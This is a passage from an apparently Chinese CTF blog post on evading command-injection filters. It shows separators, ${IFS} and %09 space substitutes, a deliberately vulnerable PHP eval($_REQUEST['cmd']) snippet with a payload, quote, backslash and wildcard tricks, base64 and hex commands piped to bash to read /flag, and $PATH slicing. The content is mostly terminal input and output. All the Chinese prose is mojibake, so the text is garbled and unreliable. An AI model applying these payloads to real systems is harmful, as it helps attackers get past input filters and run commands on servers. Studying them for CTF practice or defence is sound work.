class="hljs-meta">&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span><br><span class="hljs-meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="/img/b2.png" alt="b2"></p><p><img src="/img/b3.png" alt="b3"></p><p><strong>ç®¡é“ç¬¦(Linux)ï¼š</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="hljs-string">||å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span><br><span class="hljs-meta">&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span><br><span class="hljs-meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span><br>;       å‰åå‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br></code></pre></td></tr></table></figure><p><strong>ç©ºæ ¼ç»•è¿‡(ls &#x2F;å’Œcatç­‰å‡éœ€ç©ºæ ¼)ï¼š</strong></p><p>1.${IFS}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$&#123;IFS&#125;/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>2.$IFS$9</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$IFS$9/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>3.%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:<code>/?cmd=system(&#39;ls%09/&#39;);</code></p><p><img src="/img/b4.png" alt="b4"></p><p>4.&lt;å’Œ&lt;&gt;é‡å®šå‘ç¬¦å·</p><p>åœ¨Linuxä¸­ï¼Œ<code>&lt;</code>æ˜¯ç”¨äºé‡å®šå‘è¾“å…¥çš„ç¬¦å·ï¼Œå®ƒå°†ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‘½ä»¤çš„è¾“å…¥ã€‚<code>&lt;</code>ç¬¦å·åé¢è·Ÿç€æ–‡ä»¶åï¼Œè¡¨ç¤ºå°†è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‘½ä»¤çš„è¾“å…¥ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºinput.txtçš„æ–‡ä»¶ï¼ŒåŒ…å«äº†ä¸€äº›æ–‡æœ¬å†…å®¹ã€‚å¯ä»¥ä½¿ç”¨<code>&lt;</code>ç¬¦å·å°†input.txtæ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‘½ä»¤çš„è¾“å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt; input.txt<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å°†ä¼šæ‰§è¡Œcommandå‘½ä»¤ï¼Œå¹¶å°†input.txtæ–‡ä»¶çš„å†…å®¹ä½œä¸ºcommandå‘½ä»¤çš„è¾“å…¥ã€‚</p><p>å¦å¤–ï¼Œ<code>&gt;</code>ç¬¦å·ç”¨äºé‡å®šå‘è¾“å‡ºï¼Œå®ƒå°†å‘½ä»¤çš„è¾“å‡ºä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºè¯¥æ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¦†ç›–åŸæœ‰å†…å®¹ã€‚</p><p>è€Œ<code>&gt;&gt;</code>ç¬¦å·åˆ™ç”¨äºè¿½åŠ è¾“å‡ºï¼Œå®ƒå°†å‘½ä»¤çš„è¾“å‡ºè¿½åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶çš„æœ«å°¾ï¼Œè€Œä¸æ˜¯è¦†ç›–åŸæœ‰å†…å®¹ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºoutput.txtçš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>&gt;</code>ç¬¦å·å°†å‘½ä»¤çš„è¾“å‡ºä¿å­˜åˆ°output.txtæ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command &gt; output.txt<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å°†ä¼šæ‰§è¡Œcommandå‘½ä»¤ï¼Œå¹¶å°†å…¶è¾“å‡ºä¿å­˜åˆ°output.txtæ–‡ä»¶ä¸­ã€‚</p><p>è€Œä½¿ç”¨<code>&gt;&gt;</code>ç¬¦å·å¯ä»¥å°†å‘½ä»¤çš„è¾“å‡ºè¿½åŠ åˆ°output.txtæ–‡ä»¶çš„æœ«å°¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &gt;&gt; output.txt<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å°†ä¼šæ‰§è¡Œcommandå‘½ä»¤ï¼Œå¹¶å°†å…¶è¾“å‡ºè¿½åŠ åˆ°output.txtæ–‡ä»¶çš„æœ«å°¾ã€‚</p><p>æ€»ç»“èµ·æ¥ï¼Œ<code>&lt;</code>ç”¨äºé‡å®šå‘è¾“å…¥ï¼Œ<code>&gt;</code>ç”¨äºé‡å®šå‘è¾“å‡ºï¼Œ<code>&gt;&gt;</code>ç”¨äºè¿½åŠ è¾“å‡ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat&lt;hello.txt<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ cat&lt;&gt;hello.txt<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸œè¥¿æ²¡æ³•å’Œlsé…åˆä½¿ç”¨ã€‚</p><p>5.åˆ©ç”¨{}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ &#123;cat,hello.txt&#125;<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ &#123;ls,/&#125;<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>å¤§æ‹¬å·ï¼ˆ{}ï¼‰åœ¨è¿™ä¸ªå‘½ä»¤ä¸­è¢«ç”¨ä½œå‘½ä»¤è¡Œæ‰©å±•ã€‚å®ƒä¼šå°†å¤§æ‹¬å·ä¸­çš„å†…å®¹å±•å¼€ä¸ºå¤šä¸ªå‚æ•°ï¼Œç„¶åå°†è¿™äº›å‚æ•°ä¼ é€’ç»™å‘½ä»¤è¿›è¡Œå¤„ç†ã€‚</p><p>6.SQLè¯­å¥ä¸­å¯ä»¥åˆ©ç”¨&#x2F;**&#x2F;å’Œ()åŒ…è£¹å­—ç¬¦ä¸²ä»£æ›¿ç©ºæ ¼(è¿™ä¸ªå°±ä¸ç®—RCEé‡Œçš„ç»•è¿‡äº†ï¼Œå“ˆå“ˆ)</p><p><strong>è¿‡æ»¤å…³é”®å­—ï¼Œæ¯”å¦‚cat,tac,lsä¹‹ç±»çš„</strong></p><p>æ›¿ä»£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br><span class="hljs-built_in">head</span>:æŸ¥çœ‹å¤´å‡ è¡Œ<br><span class="hljs-built_in">tac</span>:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º <span class="hljs-built_in">tac</span> æ˜¯ <span class="hljs-built_in">cat</span> çš„åå‘æ˜¾ç¤º<br><span class="hljs-built_in">tail</span>:æŸ¥çœ‹å°¾å‡ è¡Œ<br><span class="hljs-built_in">nl</span>ï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br><span class="hljs-built_in">od</span>:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æŸäº›è½¬ä¹‰ç¬¦å·ï¼š</p><p><code>&#39;&#39;,&quot;&quot;,\,$&#123;Z&#125;,$*,$@,$ä»»æ„ï¼Œ$&#123;ä»»æ„&#125;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ l&#x27;&#x27;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l&quot;&quot;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$&#123;Z&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l/s<br>bash: l/s: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<br>[viper3@localhost ~]$ l\s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$*s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$@s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$9s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$&#123;k&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br></code></pre></td></tr></table></figure><p>æ‹¼æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ a=hel;b=lo.txt;cat $a$b<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åå¼•å·&#96;&#96;æˆ–$()ç»•è¿‡(æ¯”å¦‚å’Œprintfé…åˆä½¿ç”¨)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ printf &quot;\154\163&quot;<br>ls<br>[viper3@localhost ~]$ `printf &quot;\154\163&quot;`<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ (printf &quot;\154\163&quot;)<br>ls[viper3@localhost ~]$ $(printf &quot;\154\163&quot;)<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br></code></pre></td></tr></table></figure><p>printf â€œ??????â€è¿™ä¸œè¥¿æ˜¯è¾“å‡º???ä»£è¡¨çš„ASCIIç å€¼ï¼Œ???ä»£è¡¨å…«è¿›åˆ¶(ä¹Ÿå¯ä»¥ç”¨\x??åå…­è¿›åˆ¶)ï¼Œ$()è¿™ä¸ªç¬¦å·æ˜¯æŠŠæ‹¬å·é‡Œé¢çš„ä¸œè¥¿å½“å‘½ä»¤æ‰§è¡Œ,åå¼•å·åŒç†ã€‚</p><p>é€šé…ç¬¦</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">åœ¨Linuxä¸­ï¼Œé€šé…ç¬¦æ˜¯ç”¨æ¥åŒ¹é…æ–‡ä»¶åæˆ–è·¯å¾„çš„ç‰¹æ®Šå­—ç¬¦ã€‚å®ƒä»¬å¯ä»¥ç”¨äºå‘½ä»¤è¡Œä¸­çš„æ–‡ä»¶æœç´¢ã€æ–‡ä»¶æ“ä½œå’Œæ­£åˆ™è¡¨è¾¾å¼ç­‰åœºæ™¯ä¸­ã€‚<br><br>ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„é€šé…ç¬¦ï¼š<br><br>    *ï¼šåŒ¹é…ä»»æ„å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºå­—ç¬¦ï¼‰çš„ä»»æ„æ•°é‡ã€‚<br>    ?ï¼šåŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦ã€‚<br>    <span class="hljs-selector-attr">[]</span>ï¼šåŒ¹é…æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>    <span class="hljs-selector-attr">[!]</span> æˆ– <span class="hljs-selector-attr">[^]</span>ï¼šåŒ¹é…ä¸åœ¨æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>    &#123;&#125;ï¼šç”¨äºæŒ‡å®šå¤šä¸ªé€‰æ‹©é¡¹ï¼Œä»¥é€—å·åˆ†éš”ã€‚<br>    ~ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚<br><br>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æƒ³åŒ¹é…æ‰€æœ‰ä»¥ <span class="hljs-selector-class">.txt</span> ç»“å°¾çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ *<span class="hljs-selector-class">.txt</span>ï¼›å¦‚æœä½ æƒ³åŒ¹é…ä»¥ <span class="hljs-selector-tag">a</span> å¼€å¤´çš„ä¸‰ä¸ªå­—ç¬¦çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ <span class="hljs-selector-tag">a</span>??ã€‚<br></code></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat he*<br>hello world!<br>yes<br>no<br>why<br>tom<br>jerry<br>chris<br>jack<br>[viper3@localhost ~]$ cat ?????.txt<br>hello world!<br>yes<br>no<br>why<br>*åŒ¹é…ä»»æ„æ•°é‡ï¼Œè¿™ä¸œè¥¿å¯ä»¥å’ŒfindæŸ¥æ‰¾å‘½ä»¤ç»“åˆèµ·æ¥:<br>find / -name &quot;fl*&quot;   /æ˜¯æ ¹ç›®å½•ï¼Œæœç´¢æ ¹ç›®å½•ä¸‹æ‰€æœ‰åå­—å¸¦flçš„æ–‡ä»¶(flå¼€å¤´ï¼Œåé¢ä»»æ„)<br>æ³¨æ„ï¼šè¿™é‡Œçš„?å’Œ*éƒ½åªèƒ½ç”¨äºæ–‡ä»¶åï¼Œå¦‚æœæ˜¯å‘½ä»¤(ç±»ä¼¼ls catç­‰)å°±ä¸é€‚ç”¨ã€‚<br>ä½†æ˜¯ï¼š<br>m0reå¸ˆå‚…çš„æ–‡ç« é‡Œåœ¨å¼€å¤´åŠ äº†ä¸ª/???å°±å¯ä»¥æŠŠ/?ç”¨äºå‘½ä»¤äº†ï¼š<br><br>zxcv0221@kali:~/æ¡Œé¢$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?at flag<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?at ????<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br></code></pre></td></tr></table></figure><p><strong>ç¼–ç ç»•è¿‡(åº”è¯¥æŠŠå‰é¢é‚£ä¸ªprintfçš„æ”¾åœ¨è¿™é‡Œçš„ï¼Œå¯æƒœ)ï¼š</strong></p><p>base64:(è¿™ä¸œè¥¿å¯ä»¥å’Œå‰é¢çš„&#96;&#96;å’Œ$()é…åˆä½¿ç”¨)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d<br>cat hello.txt<br>[viper3@localhost ~]$ `echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d`<br>hello world!<br>yes<br>no<br>why<br><br>Y2F0IGhlbGxvLnR4dA== æ˜¯cat hello.txtçš„base64<br></code></pre></td></tr></table></figure><p>hex:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag<br><br>åŒä¸Šï¼Œä»èƒ½ç”¨``åŠ$()æ›¿æ¢æœ€åç®¡é“ç¬¦åŠbash<br></code></pre></td></tr></table></figure><p>æ¢è¡Œç»•è¿‡(æ„Ÿè§‰è¿™ä¸ªæ²¡æ€ä¹ˆç”¨è¿‡)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ca\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">t \</span><br><span class="language-bash">&gt; hello\</span><br><span class="language-bash">&gt; .txt</span><br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>\è¡¨ç¤ºæ¢è¡Œï¼Œä¸‹ä¸€è¡Œæ˜¯è¿™è¡Œçš„å»¶ç»­ã€‚</p><p>m0reå¸ˆå‚…çš„æ–‡ç« ä¸­è¿˜æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ca\\&quot;</span>&gt;shell   ä¸¤ä¸ª\æ˜¯ä¸ºäº†è½¬ä¹‰åé¢çš„\ï¼Œä»¥ä¾¿å°†å…¶ä½œä¸ºæ™®é€šå­—ç¬¦å†™å…¥æ–‡ä»¶ã€‚</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> shell</span><br>ca\<br>t\<br> fl\<br>ag<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh shell</span>  <br>you are good!<br><br>sh shellæ˜¯è¿è¡Œåä¸º&quot;shell&quot;çš„è„šæœ¬æ–‡ä»¶çš„æ„æ€ã€‚åœ¨Linuxä¸­ï¼Œä½¿ç”¨shå‘½ä»¤åè·Ÿè„šæœ¬æ–‡ä»¶çš„åç§°å¯ä»¥è¿è¡Œè¯¥è„šæœ¬ã€‚<br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨$PATHç¯å¢ƒå˜é‡ç»•è¿‡ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo $PATH<br>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/viper3/.local/bin:/home/viper3/bin<br>[viper3@localhost ~]$ echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;<br>ls<br>[viper3@localhost ~]$ `echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ `$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>&quot;hello.txt&quot;:1: bad minute<br>errors in crontab file, can&#x27;t install.<br><br>æ³¨æ„ä¸è¦å°‘äº†echo!<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šå†…å®¹å‚è€ƒäº†è¿™äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_53142368/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">116152477</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">391439312</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_45836474/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107248010</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net/qq_51295677?type=blog<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œåšé¢˜è®°å½•_1</title>
    <link href="/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
    <url>/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    
